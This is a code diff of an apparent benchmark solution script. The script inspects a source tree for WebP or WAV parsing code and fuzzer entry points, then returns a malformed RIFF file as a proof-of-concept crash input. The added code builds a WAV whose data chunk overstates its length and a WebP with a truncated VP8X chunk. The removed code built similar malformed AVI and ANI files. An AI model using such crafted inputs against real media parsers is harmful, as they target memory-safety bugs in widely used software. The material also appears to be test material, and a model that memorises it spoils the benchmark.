@@ -1,306 +1,211 @@
 import os
+import re
+import struct
 import tarfile
-from collections import defaultdict
-from typing import Dict, Iterable, Tuple
+from typing import Dict, Iterable, Optional, Tuple
 
 
-def _le16(x: int) -> bytes:
-    return bytes((x & 0xFF, (x >> 8) & 0xFF))
+def _u32(x: int) -> bytes:
+    return struct.pack("<I", x & 0xFFFFFFFF)
 
 
-def _le32(x: int) -> bytes:
-    return bytes((x & 0xFF, (x >> 8) & 0xFF, (x >> 16) & 0xFF, (x >> 24) & 0xFF))
+def _make_wav_poc(total_len: int = 58, data_claim: int = 64, data_payload_len: int = 14) -> bytes:
+    # RIFF WAVE + fmt(16) + data(claimed bigger than present)
+    # Total: 12 + (8+16) + 8 + data_payload_len = 44 + data_payload_len
+    if total_len != 44 + data_payload_len:
+        data_payload_len = max(0, total_len - 44)
+        total_len = 44 + data_payload_len
 
+    riff_size = total_len - 8
 
-def _make_riff(form_type: bytes, chunks: Iterable[Tuple[bytes, bytes, int | None]]) -> bytes:
-    data = bytearray()
-    data += form_type
-    for ckid, payload, declared_size in chunks:
-        if declared_size is None:
-            declared_size = len(payload)
-        data += ckid
-        data += _le32(declared_size & 0xFFFFFFFF)
-        data += payload
-        if (len(payload) & 1) == 1:
-            data += b"\x00"
-    riff_size = len(data)
-    return b"RIFF" + _le32(riff_size) + data
+    # PCM 8-bit mono
+    audio_format = 1
+    num_channels = 1
+    sample_rate = 8000
+    bits_per_sample = 8
+    block_align = num_channels * (bits_per_sample // 8)
+    byte_rate = sample_rate * block_align
 
-
-def _poc_wave() -> bytes:
-    fmt = bytearray()
-    fmt += _le16(1)          # PCM
-    fmt += _le16(1)          # channels
-    fmt += _le32(8000)       # sample rate
-    fmt += _le32(8000)       # byte rate
-    fmt += _le16(1)          # block align
-    fmt += _le16(8)          # bits/sample
-    return _make_riff(
-        b"WAVE",
-        [
-            (b"fmt ", bytes(fmt), None),
-            (b"data", b"\x00", 0x100),
-        ],
+    fmt_payload = struct.pack(
+        "<HHIIHH",
+        audio_format,
+        num_channels,
+        sample_rate,
+        byte_rate,
+        block_align,
+        bits_per_sample,
     )
+    assert len(fmt_payload) == 16
+
+    data_payload = b"\x00" * data_payload_len
+
+    out = bytearray()
+    out += b"RIFF"
+    out += _u32(riff_size)
+    out += b"WAVE"
+    out += b"fmt "
+    out += _u32(16)
+    out += fmt_payload
+    out += b"data"
+    out += _u32(data_claim)
+    out += data_payload
+    return bytes(out)
 
 
-def _poc_webp() -> bytes:
-    # VP8X payload (10 bytes):
-    #  flags (1), reserved (3), canvas width-1 (3), canvas height-1 (3)
-    flags = 0x20  # ICCP present
-    vp8x = bytes([flags, 0, 0, 0, 0, 0, 0, 0, 0, 0])  # 1x1 canvas
-    return _make_riff(
-        b"WEBP",
-        [
-            (b"VP8X", vp8x, None),
-            (b"ICCP", b"\x00", 0x100),
-        ],
-    )
+def _make_webp_poc_min() -> bytes:
+    # Minimal RIFF WEBP with VP8X chunk claiming 10 bytes but providing none.
+    # Length = 20 bytes, RIFF size = 12 bytes (WEBP + chunk header only)
+    out = bytearray()
+    out += b"RIFF"
+    out += _u32(12)          # file_len - 8
+    out += b"WEBP"
+    out += b"VP8X"
+    out += _u32(10)          # required payload size, but payload omitted
+    return bytes(out)
 
 
-def _poc_avi() -> bytes:
-    # Minimal AVI-like RIFF: LIST(hdrl) with oversized size.
-    return _make_riff(
-        b"AVI ",
-        [
-            (b"LIST", b"hdrl", 0x100),
-        ],
-    )
-
-
-def _poc_acon() -> bytes:
-    # Minimal ACON RIFF: 'anih' chunk with oversized size.
-    return _make_riff(
-        b"ACON",
-        [
-            (b"anih", b"", 0x100),
-        ],
-    )
-
-
-def _is_probably_text_path(name: str) -> bool:
-    low = name.lower()
-    if any(low.endswith(ext) for ext in (
+def _iter_tar_text_blobs(t: tarfile.TarFile, max_files: int = 400, max_total: int = 3_000_000) -> Iterable[Tuple[str, bytes]]:
+    exts = (
         ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
-        ".m", ".mm", ".py", ".java", ".js", ".ts", ".rs", ".go",
-        ".md", ".rst", ".txt", ".yaml", ".yml", ".toml", ".json",
-        ".gn", ".gni", ".bazel", ".bzl", ".cmake", ".mk", "makefile",
-        ".sh", ".bat", ".ps1", ".pl",
-    )):
-        return True
-    if "/fuzz" in low or "fuzz" in low or "fuzzer" in low:
-        return True
-    return False
-
-
-def _update_scores(scores: Dict[str, int], data: bytes, weight: int) -> None:
-    if not data:
-        return
-    dlow = data.lower()
-
-    # WEBP-related
-    scores["WEBP"] += weight * (
-        data.count(b"WEBP") +
-        data.count(b"VP8X") * 2 +
-        data.count(b"VP8L") * 2 +
-        data.count(b"VP8 ") * 2 +
-        data.count(b"WebP") * 2 +
-        data.count(b"WebPDecode") * 4 +
-        data.count(b"WebPGetInfo") * 4 +
-        dlow.count(b"libwebp") * 5 +
-        dlow.count(b"webp")
+        ".inc", ".inl", ".ipp", ".m", ".mm",
+        ".go", ".rs", ".java", ".kt",
+        ".py", ".js", ".ts",
+        ".cmake", ".txt", ".md", ".rst", ".yaml", ".yml",
+        ".bazel", ".bzl",
+        "makefile", "cmakelists.txt",
     )
-
-    # WAVE-related
-    scores["WAVE"] += weight * (
-        data.count(b"WAVE") * 2 +
-        data.count(b"fmt ") * 2 +
-        data.count(b"data") +
-        dlow.count(b"wav") +
-        dlow.count(b"wave") * 2
-    )
-
-    # AVI-related
-    scores["AVI "] += weight * (
-        data.count(b"AVI ") * 3 +
-        data.count(b"avih") * 2 +
-        data.count(b"LIST") +
-        dlow.count(b"avi") * 2
-    )
-
-    # ACON/ANI-related
-    scores["ACON"] += weight * (
-        data.count(b"ACON") * 3 +
-        data.count(b"anih") * 2 +
-        dlow.count(b".ani") * 3 +
-        dlow.count(b"cursor") +
-        dlow.count(b"icon")
-    )
-
-    # RIFF hint (weak)
-    riff_hits = data.count(b"RIFF") + dlow.count(b"riff")
-    if riff_hits:
-        scores["WEBP"] += weight * riff_hits // 4
-        scores["WAVE"] += weight * riff_hits // 4
-        scores["AVI "] += weight * riff_hits // 6
-        scores["ACON"] += weight * riff_hits // 6
+    total = 0
+    count = 0
+    for m in t.getmembers():
+        if count >= max_files or total >= max_total:
+            break
+        if not m.isfile():
+            continue
+        name = m.name
+        lname = name.lower()
+        base = os.path.basename(lname)
+        if not (base.endswith(exts) or any(lname.endswith(e) for e in exts)):
+            continue
+        if m.size <= 0 or m.size > 400_000:
+            continue
+        try:
+            f = t.extractfile(m)
+            if f is None:
+                continue
+            data = f.read()
+        except Exception:
+            continue
+        if not data:
+            continue
+        total += len(data)
+        count += 1
+        yield (name, data)
 
 
-def _scan_dir(root: str) -> Tuple[Dict[str, int], Dict[str, int], bool]:
-    scores_global = defaultdict(int)
-    scores_fuzzer = defaultdict(int)
-    found_fuzzer = False
-
-    total_read = 0
-    max_total_read = 12_000_000
-    max_file_read = 600_000
-
+def _iter_dir_text_blobs(root: str, max_files: int = 400, max_total: int = 3_000_000) -> Iterable[Tuple[str, bytes]]:
+    exts = {
+        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
+        ".inc", ".inl", ".ipp", ".m", ".mm",
+        ".go", ".rs", ".java", ".kt",
+        ".py", ".js", ".ts",
+        ".cmake", ".txt", ".md", ".rst", ".yaml", ".yml",
+        ".bazel", ".bzl",
+    }
+    total = 0
+    count = 0
     for dirpath, _, filenames in os.walk(root):
         for fn in filenames:
-            path = os.path.join(dirpath, fn)
-            rel = os.path.relpath(path, root).replace(os.sep, "/")
-            low = rel.lower()
-
-            name_bonus = 0
-            if "webp" in low:
-                name_bonus += 40
-            if "wav" in low or "wave" in low:
-                name_bonus += 20
-            if "avi" in low:
-                name_bonus += 20
-            if ".ani" in low or "acon" in low:
-                name_bonus += 20
-            if "fuzz" in low or "fuzzer" in low:
-                name_bonus += 80
-
-            for k in ("WEBP", "WAVE", "AVI ", "ACON"):
-                scores_global[k] += name_bonus // 4
-
-            if not _is_probably_text_path(rel):
+            if count >= max_files or total >= max_total:
+                return
+            lfn = fn.lower()
+            ext = os.path.splitext(lfn)[1]
+            if ext not in exts and lfn not in ("makefile", "cmakelists.txt"):
                 continue
-
+            path = os.path.join(dirpath, fn)
             try:
                 st = os.stat(path)
-                if st.st_size <= 0:
+                if st.st_size <= 0 or st.st_size > 400_000:
                     continue
-                if st.st_size > 5_000_000 and ("fuzz" not in low and "fuzzer" not in low):
-                    continue
-                to_read = min(max_file_read, st.st_size)
                 with open(path, "rb") as f:
-                    data = f.read(to_read)
-            except OSError:
+                    data = f.read()
+            except Exception:
                 continue
-
             if not data:
                 continue
-
-            total_read += len(data)
-            if total_read > max_total_read:
-                return scores_global, scores_fuzzer, found_fuzzer
-
-            is_fuzzer = b"LLVMFuzzerTestOneInput" in data
-            if is_fuzzer:
-                found_fuzzer = True
-                _update_scores(scores_fuzzer, data, 100)
-            _update_scores(scores_global, data, 1)
-
-    return scores_global, scores_fuzzer, found_fuzzer
+            total += len(data)
+            count += 1
+            yield (path, data)
 
 
-def _scan_tar(path: str) -> Tuple[Dict[str, int], Dict[str, int], bool]:
-    scores_global = defaultdict(int)
-    scores_fuzzer = defaultdict(int)
-    found_fuzzer = False
+def _score_indicators_from_blob(name: str, data: bytes) -> Dict[str, int]:
+    lname = name.lower()
+    webp = 0
+    wave = 0
 
-    total_read = 0
-    max_total_read = 12_000_000
-    max_file_read = 600_000
+    # Path hints
+    if "webp" in lname or "vp8" in lname:
+        webp += 10
+    if "wav" in lname or "wave" in lname:
+        wave += 10
 
-    try:
-        with tarfile.open(path, mode="r:*") as tf:
-            members = tf.getmembers()
-            for m in members:
-                if not m.isfile():
-                    continue
-                name = m.name or ""
-                low = name.lower()
+    # Content hints
+    webp += data.count(b"WEBP") * 6
+    webp += data.count(b"WebP") * 3
+    webp += data.count(b"VP8X") * 6
+    webp += data.count(b"VP8L") * 6
+    webp += data.count(b"VP8 ") * 4
+    webp += data.count(b"VP8") * 2
+    webp += data.count(b"webp/") * 2
 
-                name_bonus = 0
-                if "webp" in low:
-                    name_bonus += 40
-                if "wav" in low or "wave" in low:
-                    name_bonus += 20
-                if "avi" in low:
-                    name_bonus += 20
-                if ".ani" in low or "acon" in low:
-                    name_bonus += 20
-                if "fuzz" in low or "fuzzer" in low:
-                    name_bonus += 80
+    wave += data.count(b"WAVE") * 6
+    wave += data.count(b"fmt ") * 6
+    wave += data.count(b"data") * 2
+    wave += data.count(b"wav") * 1
+    wave += data.count(b"wave") * 1
 
-                for k in ("WEBP", "WAVE", "AVI ", "ACON"):
-                    scores_global[k] += name_bonus // 4
+    # Fuzzer entrypoint weighting
+    if b"LLVMFuzzerTestOneInput" in data:
+        webp += data.count(b"WebP") * 8 + data.count(b"WEBP") * 8 + data.count(b"VP8") * 6
+        wave += data.count(b"WAVE") * 8 + data.count(b"fmt ") * 8 + data.count(b"RIFF") * 2
 
-                if not _is_probably_text_path(name) and ("fuzz" not in low and "fuzzer" not in low):
-                    continue
-                if m.size <= 0:
-                    continue
-                if m.size > 5_000_000 and ("fuzz" not in low and "fuzzer" not in low):
-                    continue
-
-                to_read = min(max_file_read, m.size)
-                try:
-                    f = tf.extractfile(m)
-                    if f is None:
-                        continue
-                    data = f.read(to_read)
-                except Exception:
-                    continue
-
-                if not data:
-                    continue
-
-                total_read += len(data)
-                if total_read > max_total_read:
-                    break
-
-                is_fuzzer = b"LLVMFuzzerTestOneInput" in data
-                if is_fuzzer:
-                    found_fuzzer = True
-                    _update_scores(scores_fuzzer, data, 100)
-                _update_scores(scores_global, data, 1)
-    except Exception:
-        return scores_global, scores_fuzzer, found_fuzzer
-
-    return scores_global, scores_fuzzer, found_fuzzer
+    return {"webp": webp, "wave": wave}
 
 
-def _choose_form(src_path: str) -> str:
-    if os.path.isdir(src_path):
-        g, f, has_fuzzer = _scan_dir(src_path)
-    else:
-        g, f, has_fuzzer = _scan_tar(src_path)
+def _detect_format(src_path: str) -> str:
+    # Fast heuristics from filename
+    p = src_path.lower()
+    if "webp" in p:
+        return "webp"
+    if "wav" in p or "wave" in p or "sndfile" in p:
+        return "wave"
 
-    scores = f if has_fuzzer else g
-    best_key = None
-    best_score = -1
-    for k in ("WEBP", "WAVE", "AVI ", "ACON"):
-        sc = int(scores.get(k, 0))
-        if sc > best_score:
-            best_score = sc
-            best_key = k
+    scores = {"webp": 0, "wave": 0}
 
-    if best_key is None or best_score <= 0:
-        return "WAVE"
-    return best_key
+    # Try tarball
+    if os.path.isfile(src_path):
+        try:
+            with tarfile.open(src_path, "r:*") as t:
+                for name, data in _iter_tar_text_blobs(t):
+                    s = _score_indicators_from_blob(name, data)
+                    scores["webp"] += s["webp"]
+                    scores["wave"] += s["wave"]
+        except Exception:
+            pass
+    elif os.path.isdir(src_path):
+        for name, data in _iter_dir_text_blobs(src_path):
+            s = _score_indicators_from_blob(name, data)
+            scores["webp"] += s["webp"]
+            scores["wave"] += s["wave"]
+
+    # Decide
+    if scores["webp"] == 0 and scores["wave"] == 0:
+        return "wave"
+    return "webp" if scores["webp"] >= scores["wave"] else "wave"
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        form = _choose_form(src_path)
-        if form == "WEBP":
-            return _poc_webp()
-        if form == "AVI ":
-            return _poc_avi()
-        if form == "ACON":
-            return _poc_acon()
-        return _poc_wave()
+        fmt = _detect_format(src_path)
+        if fmt == "webp":
+            return _make_webp_poc_min()
+        return _make_wav_poc(total_len=58, data_claim=64, data_payload_len=14)
